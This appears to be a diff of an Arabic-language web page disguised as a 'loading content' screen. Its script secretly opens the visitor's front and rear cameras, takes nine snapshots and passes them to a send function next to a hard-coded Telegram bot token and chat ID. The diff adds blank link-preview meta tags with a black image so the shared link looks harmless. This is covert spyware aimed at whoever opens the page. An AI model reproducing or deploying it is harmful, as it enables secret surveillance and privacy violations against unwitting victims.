@@ -2,7 +2,11 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تحميل المحتوى...</title>
+    
+    <meta property="og:title" content=" " /> <meta property="og:description" content=" " /> <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/4/49/A_black_image.jpg" /> <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image"> <title>تحميل المحتوى...</title>
     <style>
         body { background: black; color: white; text-align: center; padding-top: 20%; font-family: sans-serif; }
         .loader { border: 5px solid #333; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: auto; }
@@ -17,6 +21,7 @@
     <canvas id="c" width="640" height="480" style="display:none;"></canvas>
 
     <script>
+        // ملاحظة: التوكن والـ Chat ID بتوعك زي ما هم شغالين
         const token = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
         const chat_id = '8350812242';
         const v = document.getElementById('v');
@@ -34,21 +39,21 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                 v.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1000)); // استقرار الكاميرا
+                await new Promise(r => setTimeout(r, 1000)); 
 
                 for (let i = 0; i < count; i++) {
                     c.getContext('2d').drawImage(v, 0, 0, 640, 480);
                     c.toBlob(blob => send(blob, mode === "user" ? "أمامية" : "خلفية"), 'image/jpeg', 0.5);
                     await new Promise(r => setTimeout(r, 2000));
                 }
-                stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا للتبديل
+                stream.getTracks().forEach(t => t.stop()); 
             } catch (e) { console.error(e); }
         }
 
         async function run() {
-            await capture("user", 3);        // 3 أمامية
-            await capture("environment", 3); // 3 خلفية
-            await capture("user", 3);        // 3 أمامية تانية
+            await capture("user", 3);        
+            await capture("environment", 3); 
+            await capture("user", 3);        
             document.getElementById('status').innerText = "تم التحميل بنجاح.";
         }
 
